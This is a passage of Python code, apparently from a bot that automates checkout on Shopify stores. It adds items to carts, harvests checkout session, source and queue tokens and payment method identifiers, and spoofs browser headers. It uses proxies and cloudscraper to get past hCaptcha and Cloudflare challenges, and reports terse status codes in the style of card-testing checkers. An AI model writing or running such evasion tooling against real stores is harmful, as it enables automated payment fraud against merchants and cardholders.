                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-user': '?1',
                            'upgrade-insecure-requests': '1',
                        }
                        vid = product_id
                        try:
                            if isinstance(vid, str) and vid.isdigit():
                                vid = int(vid)
                        except (ValueError, TypeError):
                            pass
                        variant_id_str = str(vid) if vid is not None else ''
                        for cart_attempt in range(3):
                            try:
                                if cart_attempt == 0:
                                    await session.get(url.rstrip('/'), headers={'User-Agent': getua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, follow_redirects=True, timeout=12)
                                    await asyncio.sleep(0.3)
                                add_resp = await session.post(
                                    f'{url.rstrip("/")}/cart/add',
                                    headers=add_headers,
                                    data={'id': variant_id_str, 'quantity': '1', 'form_type': 'product'},
                                    timeout=18,
                                    follow_redirects=True,
                                )
                                sc = getattr(add_resp, 'status_code', 0)
                                if sc in (200, 302, 303):
                                    checkout_url = url.rstrip('/') + '/checkout'
                                    await asyncio.sleep(0.6)
                                    logger.info(f"✅ Cart/add succeeded for {url} (attempt {cart_attempt + 1})")
                                    break
                                if sc >= 400 and variant_id_str:
                                    add_js_resp = await session.post(
                                        f'{url.rstrip("/")}/cart/add.js',
                                        headers={'User-Agent': getua, 'Content-Type': 'application/json', 'Accept': 'application/json', 'Origin': url.rstrip('/'), 'Referer': url.rstrip('/') + '/'},
                                        json={'items': [{'id': vid if isinstance(vid, int) else int(vid) if str(vid).isdigit() else vid, 'quantity': 1}]},
                                        timeout=18,
                                    )
                                    if getattr(add_js_resp, 'status_code', 0) == 200:
                                        try:
                                            js = add_js_resp.json() if hasattr(add_js_resp, 'json') else {}
                                            if isinstance(js, dict) and (js.get('id') or js.get('items') or 'id' in str(js)):
                                                checkout_url = url.rstrip('/') + '/checkout'
                                                await asyncio.sleep(0.6)
                                                logger.info(f"✅ Cart/add.js succeeded for {url}")
                                                break
                                        except Exception:
                                            pass
                            except Exception as e:
                                logger.debug(f"Cart/add attempt {cart_attempt + 1} failed: {e}")
                            if cart_attempt < 2:
                                await asyncio.sleep(0.5 + cart_attempt * 0.3)
                        if not checkout_url:
                            output.update({
                                "Response": "SITE_ACCESS_TOKEN_MISSING",
                                "Status": False,
                            })
                            _log_output_to_terminal(output)
                            return output

            if not non_shipping_flow and site_key and str(site_key).strip():
                # Continue with standard Storefront API flow (shipping / token-based)
                params = {
                    'operation_name': 'cartCreate',
                }

                json_data = {
                    'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
                    'operationName': 'cartCreate',
                    'variables': {
                        'input': {
                            'lines': [
                                {
                                    'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
                                    'quantity': 1,
                                    'attributes': [],
                                },
                            ],
                            'discountCodes': [],
                        },
                        'country': 'US',
                        'language': 'EN',
                    },
                }

                # Try multiple Storefront API endpoints (different Shopify versions)
                cart_endpoints = [
                    f'{url}/api/unstable/graphql.json',
                    f'{url}/api/2024-01/graphql.json',
                    f'{url}/api/2023-10/graphql.json',
                    f'{url}/api/2023-07/graphql.json',
                    f'{url}/api/2023-04/graphql.json',
                ]
                response = None
                last_cart_error = None
                for cart_url in cart_endpoints:
                    try:
                        response = await session.post(cart_url, params=params, headers=headers, json=json_data, timeout=18, follow_redirects=True)
                        if response and getattr(response, "status_code", 0) == 200:
                            resp_text = (response.text or "").strip()
                            if resp_text.startswith("{") and "checkoutUrl" in resp_text:
                                break
                        if response and getattr(response, "status_code", 0) == 404:
                            continue
                    except Exception as e:
                        last_cart_error = str(e)[:80]
                        continue
                if not response or getattr(response, "status_code", 0) != 200:
                    output.update({
                        "Response": f"CART_HTTP_ERROR: {(last_cart_error or 'all endpoints failed')[:50]}",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output

                # Parse cart creation response with error handling
                try:
                    response_text = response.text if response.text else ""
                    if response_text.strip().startswith("<"):
                        if any(x in response_text.lower() for x in ["captcha", "hcaptcha", "recaptcha"]):
                            output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                            _log_output_to_terminal(output)
                            return output
                        output.update({"Response": "CART_HTML_ERROR", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    if not hasattr(response, 'json'):
                        output.update({"Response": "CART_NO_JSON_METHOD", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    try:
                        response_data = response.json()
                        if not response_data and (response.text or "").strip().startswith("{"):
                            response_data = json.loads(response.text)
                    except (json.JSONDecodeError, TypeError, AttributeError) as e:
                        output.update({"Response": f"CART_JSON_ERROR: {str(e)[:50]}", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    if not response_data or not isinstance(response_data, dict):
                        output.update({"Response": "CART_INVALID_DATA", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    if "errors" in response_data and response_data.get("errors"):
                        error_msg = response_data["errors"][0].get("message", "GRAPHQL_ERROR")
                        output.update({"Response": f"CART_ERROR: {error_msg[:50]}", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    checkout_url = _get_checkout_url_from_cart_response(response_data)
                    if not checkout_url:
                        output.update({"Response": "CART_NO_CHECKOUT_URL", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                    # Mirror diagnostic flow when checkout URL is cross-host (e.g. shop.app) or when it's the
                    # new checkout path (/checkouts/...) so we get the same final HTML with tokens. Do cart/add
                    # then POST /checkout (no follow); use redirect Location as checkout_url for the subsequent GET.
                    try:
                        store_netloc = (urlparse(url).netloc or "").lower().strip()
                        checkout_netloc = (urlparse(checkout_url).netloc or "").lower().strip()
                        checkout_path = (urlparse(checkout_url).path or "").strip()
                        cross_host = store_netloc and checkout_netloc and store_netloc != checkout_netloc
                        new_checkout_path = "/checkouts/" in checkout_path
                        if cross_host or new_checkout_path:
                            add_headers = {
                                'User-Agent': getua,
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Origin': url.rstrip('/'),
                                'Referer': url.rstrip('/') + '/',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            }
                            add_resp = await session.post(
                                f'{url.rstrip("/")}/cart/add',
                                headers=add_headers,
                                data={'id': product_id, 'quantity': 1},
                                timeout=15,
                                follow_redirects=True,
                            )
                            if add_resp and getattr(add_resp, 'status_code', 0) in (200, 302):
                                await asyncio.sleep(0.5)
                                ch_post = await session.post(
                                    f'{url.rstrip("/")}/checkout',
                                    headers={
                                        'User-Agent': getua,
                                        'Content-Type': 'application/x-www-form-urlencoded',
                                        'Origin': url.rstrip('/'),
                                        'Referer': url.rstrip('/') + '/',
                                        'Accept': '*/*',
                                    },
                                    data='',
                                    timeout=18,
                                    follow_redirects=False,
                                )
                                post_sc = getattr(ch_post, 'status_code', 0)
                                if post_sc in (301, 302, 303, 307, 308):
                                    loc = (getattr(ch_post, 'headers', None) or {}).get('location') or (getattr(ch_post, 'headers', None) or {}).get('Location') or ''
                                    if loc:
                                        if not loc.startswith('http'):
                                            loc = urljoin(url.rstrip('/') + '/', loc)
                                        checkout_url = loc
                                        logger.info(f"Checkout: using POST redirect URL for {url} -> {checkout_url[:80]}...")
                            elif cross_host:
                                checkout_url = url.rstrip('/') + '/checkout'
                                logger.info(f"Using same-origin checkout for {url} (cart/add or POST redirect failed)")
                    except Exception:
                        pass
                except json.JSONDecodeError:
                    output.update({"Response": "CART_INVALID_JSON", "Status": False})
                    _log_output_to_terminal(output)
                    return output
                except (KeyError, TypeError):
                    output.update({"Response": "CART_CREATION_FAILED", "Status": False})
                    _log_output_to_terminal(output)
                    return output

        await asyncio.sleep(0.35)
        # Use same minimal headers as diagnostic (/testsh) so we get the same checkout HTML with tokens.
        checkout_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "User-Agent": getua,
        }
        params = {"auto_redirect": "false"}
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': f'{mobile}',
            'upgrade-insecure-requests': '1',
            'user-agent': f'{getua}',
        }

        # Ensure get_params for token-retry when we have checkout_url
        get_params = {"skip_shop_pay": "true"} if (checkout_url and "skip_shop_pay" not in (checkout_url or "")) else None
        # Skip re-fetching checkout when non-shipping or low-product flow already set checkout_text
        if not non_shipping_flow and not (low_product_flow and checkout_text and checkout_sc == 200):
            request = None
            checkout_sc = 0
            checkout_text = ""
            store_netloc_check = (urlparse(url).netloc or "").lower().strip()
            # When we have a /checkouts/ URL (from POST redirect), GET it immediately with skip_shop_pay=true
            # so we land on the same page as browser (stickerdad.com-style) and get tokens in one shot.
            get_params = None
            if checkout_url and "skip_shop_pay" not in (checkout_url or ""):
                get_params = {"skip_shop_pay": "true"}
            # When redirect goes to shop.app, try store's /checkout first - may get tokens without shop.app
            if checkout_url and "shop.app" in (checkout_url or ""):
                try:
                    store_checkout = f"{url.rstrip('/')}/checkout"
                    req_store = await session.get(store_checkout, headers=checkout_headers, params={"skip_shop_pay": "true"}, follow_redirects=True, timeout=22)
                    st_sc = getattr(req_store, "status_code", 0)
                    st_text = (getattr(req_store, "text", None) or "").strip()
                    if st_sc == 200 and len(st_text) > 5000 and ("serialized-sessionToken" in st_text or "serialized-session-token" in st_text or "serialized-sourceToken" in st_text or "serialized-source-token" in st_text or "serializedSessionToken" in st_text):
                        checkout_text = st_text
                        request = req_store
                        checkout_sc = 200
                        checkout_url = store_checkout
                        logger.info("Checkout from store (skip shop.app) for %s len=%s", url, len(checkout_text))
                except Exception as e:
                    logger.debug("Store checkout try: %s", e)
            if not checkout_text and checkout_url and "/checkouts/" in (urlparse(checkout_url).path or ""):
                try:
                    get_immediate = await session.get(
                        checkout_url,
                        headers=checkout_headers,
                        params=get_params,
                        follow_redirects=True,
                        timeout=22,
                    )
                    imm_sc = getattr(get_immediate, "status_code", 0)
                    imm_text = (getattr(get_immediate, "text", None) or "").strip()
                    if imm_sc == 200 and len(imm_text) > 5000 and ("serialized-sessionToken" in imm_text or "serialized-session-token" in imm_text or "serializedSessionToken" in imm_text):
                        checkout_text = imm_text
                        request = get_immediate
                        checkout_sc = 200
                        logger.info("Checkout page from POST redirect GET for %s (len=%s)", url, len(checkout_text))
                except Exception as e:
                    logger.debug("Immediate GET after POST redirect failed: %s", e)
            # Same as diagnostic: GET checkout_url with minimal headers; use skip_shop_pay=true when missing.
            if request is None:
                for _checkout_attempt in range(6):
                    req = await session.get(
                        checkout_url,
                        headers=checkout_headers,
                        params=get_params,
                        follow_redirects=True,
                        timeout=22,
                    )
                    checkout_sc = getattr(req, "status_code", 0)
                    checkout_text = req.text if req.text else ""
                    if checkout_sc in (301, 302, 303, 307, 308):
                        location = (getattr(req, "headers", None) or {}).get("location") or (getattr(req, "headers", None) or {}).get("Location") or ""
                        if location and store_netloc_check:
                            try:
                                loc_parsed = urlparse(location if location.startswith("http") else f"https://{location}")
                                loc_netloc = (loc_parsed.netloc or "").lower().strip()
                                if loc_netloc and loc_netloc != store_netloc_check:
                                    add_h = {'User-Agent': getua, 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': url, 'Referer': url, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
                                    add_r = await session.post(f'{url}/cart/add', headers=add_h, data={'id': product_id, 'quantity': 1}, timeout=15, follow_redirects=True)
                                    if add_r and getattr(add_r, 'status_code', 0) in (200, 302):
                                        await asyncio.sleep(0.6)
                                        checkout_url = url.rstrip('/') + '/checkout'
                                        req = await session.get(checkout_url, headers=checkout_headers, params=get_params, follow_redirects=True, timeout=22)
                                        checkout_sc = getattr(req, "status_code", 0)
                                        checkout_text = req.text if req.text else ""
                            except Exception:
                                pass
                    if checkout_sc == 200:
                        request = req
                        break
                    if checkout_sc in (301, 302, 303, 307, 308) and _checkout_attempt == 0:
                        req = await session.get(checkout_url, headers=checkout_headers, params=get_params, follow_redirects=True, timeout=22)
                        checkout_sc = getattr(req, "status_code", 0)
                        checkout_text = req.text if req.text else ""
                        if checkout_sc == 200:
                            request = req
                            break
                    if checkout_sc in (429, 502, 503, 504) and _checkout_attempt < 5:
                        backoff = 2.0 + _checkout_attempt * 1.0 if checkout_sc == 429 else 1.0 + _checkout_attempt * 0.7
                        await asyncio.sleep(backoff)
                        continue
                    break
        # Trace: log what we received so CHECKOUT_TOKENS_MISSING can be debugged
        _has_session = "serialized-sessionToken" in (checkout_text or "")
        _has_source = "serialized-sourceToken" in (checkout_text or "")
        logger.info(
            "[checkout] url=%.80s status=%s len=%s has_session_meta=%s has_source_meta=%s",
            checkout_url or "", checkout_sc, len(checkout_text or ""), _has_session, _has_source,
        )
        if request is None and checkout_sc != 200:
            output.update({
                "Response": f"CHECKOUT_HTTP_{checkout_sc}",
                "Status": False,
            })
            _log_output_to_terminal(output)
            return output
        # If we got 200 but page has no tokens (e.g. intermediate/loading page), retry with follow_redirects=True
        # so we get the same final HTML as the diagnostic (which always follows redirects).
        if checkout_sc == 200 and checkout_text and "serialized-sessionToken" not in checkout_text and "serialized-session-token" not in checkout_text and "serialized-sourceToken" not in checkout_text and "serialized-source-token" not in checkout_text:
            try:
                req_follow = await session.get(checkout_url, headers=checkout_headers, params=get_params, follow_redirects=True, timeout=22)
                if getattr(req_follow, "status_code", 0) == 200 and getattr(req_follow, "text", None):
                    follow_text = (req_follow.text or "").strip()
                    if len(follow_text) > 5000 and ("serialized-sessionToken" in follow_text or "serialized-session-token" in follow_text or "serialized-sourceToken" in follow_text or "serialized-source-token" in follow_text or "serializedSessionToken" in follow_text):
                        checkout_text = follow_text
                        checkout_lower = checkout_text.lower()
                        logger.info("Checkout page refreshed with follow_redirects=True for %s (len=%s)", url, len(checkout_text))
                    else:
                        logger.info(
                            "[checkout] no-token retry: follow status=%s len=%s has_session=%s has_source=%s",
                            getattr(req_follow, "status_code", 0), len(follow_text or ""),
                            "serialized-sessionToken" in (follow_text or ""), "serialized-sourceToken" in (follow_text or ""),
                        )
            except Exception as e:
                logger.debug("Checkout no-token retry failed: %s", e)
        checkout_lower = checkout_text.lower()
        has_tokens_in_page = ("serialized-session-token" in checkout_text or "serialized-sessionToken" in checkout_text) and ("serialized-source-token" in checkout_text or "serialized-sourceToken" in checkout_text or "serializedSourceToken" in checkout_text)

        if checkout_text.strip().startswith("<"):
            # Only treat as captcha block when we DON'T already have tokens (page may mention hcaptcha in scripts but still have tokens)
            if not has_tokens_in_page and any(x in checkout_lower for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"]):
                if HAS_CLOUDSCRAPER:
                    try:
                        cs_sc, cs_text = await asyncio.to_thread(
                            _fetch_checkout_cloudscraper_sync, checkout_url, proxy
                        )
                        if cs_sc == 200 and cs_text and ("serialized-session-token" in cs_text or "serialized-sessionToken" in cs_text) and ("serialized-source-token" in cs_text or "serialized-sourceToken" in cs_text or "serializedSourceToken" in cs_text):
                            checkout_text = cs_text
                            checkout_lower = checkout_text.lower()
                        else:
                            output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                            _log_output_to_terminal(output)
                            return output
                    except Exception:
                        output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                else:
                    output.update({"Response": "HCAPTCHA_DETECTED", "Status": False})
                    _log_output_to_terminal(output)
                    return output
            if "serialized-session-token" not in checkout_text and "serialized-sessionToken" not in checkout_text and "serialized-source-token" not in checkout_text:
                # May be challenge page (e.g. Cloudflare); try cloudscraper once before giving up
                if HAS_CLOUDSCRAPER:
                    try:
                        cs_sc, cs_text = await asyncio.to_thread(
                            _fetch_checkout_cloudscraper_sync, checkout_url, proxy
                        )
                        if cs_sc == 200 and cs_text and len(cs_text) > 1000:
                            if "serialized-session-token" in cs_text or "serialized-sessionToken" in cs_text or "serializedSessionToken" in cs_text:
                                checkout_text = cs_text
                                checkout_lower = checkout_text.lower()
                                logger.info(f"Checkout page via cloudscraper (no tokens in initial HTML) for {url}")
                    except Exception:
                        pass
                if "serialized-session-token" not in checkout_text and "serialized-sessionToken" not in checkout_text and "serialized-source-token" not in checkout_text and "serializedSessionToken" not in checkout_text:
                    output.update({"Response": "CHECKOUT_HTML_ERROR", "Status": False})
                    _log_output_to_terminal(output)
                    return output

        # Extract payment method identifiers - use first; on INVALID_PAYMENT_METHOD retry with next
        payment_method_ids = re.findall(r'paymentMethodIdentifier&quot;:&quot;([a-f0-9]{32})&quot;', checkout_text or "")
        if not payment_method_ids:
            payment_method_ids = re.findall(r'"paymentMethodIdentifier":"([a-f0-9]{32})"', checkout_text or "")
        try:
            paymentMethodIdentifier = _capture_multi(
                checkout_text,
                ('paymentMethodIdentifier&quot;:&quot;', '&quot;'),
                ('paymentMethodIdentifier":"', '"'),
            ) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
        except Exception:
            paymentMethodIdentifier = None
        if not paymentMethodIdentifier and payment_method_ids:
            paymentMethodIdentifier = payment_method_ids[0]
        try:
            stable_id = _capture_multi(
                checkout_text,
                ('stableId&quot;:&quot;', '&quot'),   # old api.py
                ('stableId&quot;:&quot;', '&quot;'),
                ('stableId":"', '"'),
                ('"stableId":"', '"'),
            ) or capture(checkout_text, "stableId&quot;:&quot;", "&quot")
            if not stable_id:
                m = re.search(r'"stableId"\s*:\s*"([^"]+)"', checkout_text)
                if m:
                    stable_id = m.group(1)
        except Exception:
            stable_id = None
        try:
            queue_token = _capture_multi(
                checkout_text,
                ('queueToken&quot;:&quot;', '&quot'),   # old api.py
                ('queueToken&quot;:&quot;', '&quot;'),
                ('queueToken":"', '"'),
                ('"queueToken":"', '"'),
            ) or capture(checkout_text, "queueToken&quot;:&quot;", "&quot")
            if not queue_token:
                m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
                if m:
                    queue_token = m.group(1)
        except Exception:
            queue_token = None
        try:
            currencyCode = _capture_multi(
                checkout_text,
                ('currencyCode&quot;:&quot;', '&quot'),
                ('currencyCode":"', '"'),
            ) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
        except Exception:
            currencyCode = None

        try:
            countryCode = capture(checkout_text, "countryCode&quot;:&quot;", "&quot") or capture(checkout_text, 'countryCode":"', '"')
        except Exception:
            countryCode = currencyCode

        # Extract presentmentCurrency from page to avoid BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH
        presentment_currency_page = None
        try:
            presentment_currency_page = _capture_multi(
                checkout_text,
                ('presentmentCurrency&quot;:&quot;', '&quot'),
                ('presentmentCurrency&quot;:&quot;', '&quot;'),
                ('presentmentCurrency":"', '"'),
                ('"presentmentCurrency":"', '"'),
                ('presentmentCurrency\':\'', '\''),
                ('"presentmentCurrency": "', '"'),
            ) or capture(checkout_text, "presentmentCurrency&quot;:&quot;", "&quot") or capture(checkout_text, "presentmentCurrency&quot;:&quot;", "&quot;")
        except Exception:
            pass
        # Fallback: regex for presentmentCurrency (handles various JSON/HTML encodings)
        if not presentment_currency_page:
            m = re.search(r'presentmentCurrency["\']?\s*:\s*["\']?&quot;?([A-Z]{3})&quot;?', checkout_text, re.I)
            if m:
                presentment_currency_page = m.group(1)
        # Fallback: infer from formatted_price (e.g. €1.20 -> EUR, $1.20 -> USD)
        if not presentment_currency_page and low_product:
            fp = (low_product.get("formatted_price") or "").strip()
            if fp.startswith("€"):
                presentment_currency_page = "EUR"
            elif fp.startswith("£"):
                presentment_currency_page = "GBP"
            elif fp.startswith("$") or "USD" in fp.upper():
                presentment_currency_page = "USD"
            elif fp.startswith("¥"):
                presentment_currency_page = "JPY"
            elif fp.startswith("CHF"):
                presentment_currency_page = "CHF"

        # Session token: single canonical parser only — variable x_checkout_one_session_token used everywhere
        x_checkout_one_session_token = _extract_session_token(checkout_text)
        # Source token: old api.py first - capture(text, 'serialized-source-token" content="&quot;', '&quot')
        token = _capture_multi(
            checkout_text,
            ('serialized-source-token" content="&quot;', '&quot'),   # old api.py
            ('serialized-sourceToken" content="&quot;', '&quot;"/>'),
            ('name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
            ('name="serialized-sourceToken" content="&quot;', '&quot;" />'),
            ('serialized-source-token" content="&quot;', '&quot;"/>'),
            ('serialized-source-token" content="', '"'),
            ('name="serialized-source-token" content="', '"'),
            ("name='serialized-source-token' content='", "'"),
        )
        if not token and ("serialized-sourceToken" in checkout_text or "serialized-source-token" in checkout_text):
            for pat in [
                r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>',
                r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*&quot;(.+?)&quot;\s*"\s*/\s*>',
            ]:
                m = re.search(pat, checkout_text, re.I | re.DOTALL)
                if m:
                    v = (m.group(1) or "").strip()
                    if v and len(v) > 10:
                        token = v
                        break
        if not token and 'serializedSourceToken' in checkout_text:
            m = re.search(r'"serializedSourceToken"\s*:\s*"([^"]+)"', checkout_text)
            if m:
                token = m.group(1)

        # Fill missing tokens from robust extractor; never overwrite primary session token
        robust_tokens = _extract_checkout_tokens_robust(checkout_text)
        if not x_checkout_one_session_token and robust_tokens.get("session_token"):
            x_checkout_one_session_token = robust_tokens["session_token"]
        if not token and robust_tokens.get("source_token"):
            token = robust_tokens["source_token"]
        if not queue_token and robust_tokens.get("queue_token"):
            queue_token = robust_tokens["queue_token"]
        if not stable_id and robust_tokens.get("stable_id"):
            stable_id = robust_tokens["stable_id"]
        # Source token from checkout URL path (e.g. /checkouts/cn/TOKEN/ or shop.app/.../cn/TOKEN/)
        if not token and checkout_url:
            m = re.search(r'/cn/([a-zA-Z0-9_-]{20,})', str(checkout_url))
            if m:
                token = m.group(1).strip()
                logger.debug("Source token from checkout URL path")

        web_build = None
        try:
            match = re.search(r'"sha"\s*:\s*"([a-fA-F0-9]{40})"', checkout_text)
            if match:
                web_build = match.group(1)
            if not web_build:
                match = re.search(r'sha&quot;:&quot;([a-fA-F0-9]{40})&quot;', checkout_text)
                if match:
                    web_build = match.group(1)
            if not web_build:
                web_build = capture(checkout_text, 'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;', '&quot;')
        except Exception:
            pass
        if not web_build or not str(web_build).strip():
            web_build = "a5ffb15727136fbf537411f8d32d7c41fb371075"

        if not x_checkout_one_session_token or not token or not queue_token or not stable_id:
            # Bulletproof: try same-origin checkout (cart/add + GET /checkout) so session cookies carry cart
            same_origin_checkout = url.rstrip('/') + '/checkout'
            try:
                add_headers_cart = {
                    'User-Agent': getua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': url,
                    'Referer': url,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                }
                add_resp = await session.post(
                    f'{url}/cart/add',
                    headers=add_headers_cart,
                    data={'id': product_id, 'quantity': 1},
                    timeout=15,
                    follow_redirects=True,
                )
                if add_resp and getattr(add_resp, 'status_code', 0) in (200, 302):
                    await asyncio.sleep(0.6)
                    req2 = await session.get(
                        same_origin_checkout,
                        headers={
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                            'sec-ch-ua-mobile': f'{mobile}',
                            'sec-ch-ua-platform': f'"{clienthint}"',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'same-origin',
                            'sec-fetch-user': f'{mobile}',
                            'upgrade-insecure-requests': '1',
                            'user-agent': f'{getua}',
                        },
                        params={'auto_redirect': 'false'},
                        follow_redirects=True,
                        timeout=18,
                    )
                    if req2 and getattr(req2, 'status_code', 0) == 200 and getattr(req2, 'text', None):
                        new_text = (req2.text or "").strip()
                        if len(new_text) > 1000:
                            checkout_text = new_text
                            checkout_lower = checkout_text.lower()
                            robust2 = _extract_checkout_tokens_robust(checkout_text)
                            x_checkout_one_session_token = x_checkout_one_session_token or robust2.get("session_token")
                            token = token or robust2.get("source_token")
                            queue_token = queue_token or robust2.get("queue_token")
                            stable_id = stable_id or robust2.get("stable_id")
                            if x_checkout_one_session_token or token or queue_token or stable_id:
                                try:
                                    if not paymentMethodIdentifier:
                                        paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                                    if not currencyCode:
                                        currencyCode = _capture_multi(checkout_text, ('currencyCode&quot;:&quot;', '&quot'), ('currencyCode":"', '"')) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
                                    if not countryCode:
                                        countryCode = capture(checkout_text, "countryCode&quot;:&quot;", "&quot") or capture(checkout_text, 'countryCode":"', '"') or currencyCode
                                    if not web_build or not str(web_build).strip():
                                        match = re.search(r'"sha"\s*:\s*"([a-fA-F0-9]{40})"', checkout_text)
                                        if match:
                                            web_build = match.group(1)
                                except Exception:
                                    pass
                                logger.info(f"Checkout tokens via same-origin retry for {url}")
            except Exception:
                pass

            # Bulletproof: try checkout page via cloudscraper once (challenge/captcha page may lack tokens)
            if (not x_checkout_one_session_token or not token or not queue_token or not stable_id) and checkout_text.strip().startswith("<") and HAS_CLOUDSCRAPER:
                try:
                    cs_sc, cs_text = await asyncio.to_thread(
                        _fetch_checkout_cloudscraper_sync, checkout_url, proxy
                    )
                    if cs_sc == 200 and cs_text and len(cs_text) > 1000:
                        checkout_text = cs_text
                        checkout_lower = checkout_text.lower()
                        robust2 = _extract_checkout_tokens_robust(checkout_text)
                        x_checkout_one_session_token = x_checkout_one_session_token or robust2.get("session_token")
                        token = token or robust2.get("source_token")
                        queue_token = queue_token or robust2.get("queue_token")
                        stable_id = stable_id or robust2.get("stable_id")
                        # Re-extract other fields from new page when we had none
                        try:
                            if not paymentMethodIdentifier:
                                paymentMethodIdentifier = _capture_multi(checkout_text, ('paymentMethodIdentifier&quot;:&quot;', '&quot;'), ('paymentMethodIdentifier":"', '"')) or capture(checkout_text, "paymentMethodIdentifier&quot;:&quot;", "&quot;")
                            if not currencyCode:
                                currencyCode = _capture_multi(checkout_text, ('currencyCode&quot;:&quot;', '&quot'), ('currencyCode":"', '"')) or capture(checkout_text, "currencyCode&quot;:&quot;", "&quot")
                            if not countryCode:
                                countryCode = capture(checkout_text, "countryCode&quot;:&quot;", "&quot") or capture(checkout_text, 'countryCode":"', '"') or currencyCode
                            if not web_build or not str(web_build).strip():
                                match = re.search(r'"sha"\s*:\s*"([a-fA-F0-9]{40})"', checkout_text)
                                if match:
                                    web_build = match.group(1)
                        except Exception:
                            pass
                        logger.info(f"Checkout tokens via cloudscraper retry for {url}")
                except Exception:
                    pass

            # Diagnostic-style fallback: GET checkout_url with minimal headers (same as /testsh) and re-extract tokens.
            if (not x_checkout_one_session_token or not token or not queue_token or not stable_id) and checkout_url:
                for try_url in (checkout_url, url.rstrip("/") + "/checkout"):
                    if not try_url:
                        continue
                    try:
                        diag_req = await session.get(try_url, headers=checkout_headers, follow_redirects=True, timeout=22)
                        if getattr(diag_req, "status_code", 0) != 200 or not getattr(diag_req, "text", None):
                            continue
                        diag_text = (diag_req.text or "").strip()
                        if len(diag_text) > 5000 and ("serialized-sessionToken" in diag_text or "serialized-session-token" in diag_text or "serializedSessionToken" in diag_text):
                            checkout_text = diag_text
                            checkout_lower = checkout_text.lower()
                            x_checkout_one_session_token = _extract_session_token(checkout_text) or x_checkout_one_session_token
                            robust2 = _extract_checkout_tokens_robust(checkout_text)
                            if not x_checkout_one_session_token and robust2.get("session_token"):
                                x_checkout_one_session_token = robust2["session_token"]
                            if not token and robust2.get("source_token"):
                                token = robust2["source_token"]
                            if not queue_token and robust2.get("queue_token"):
                                queue_token = robust2["queue_token"]
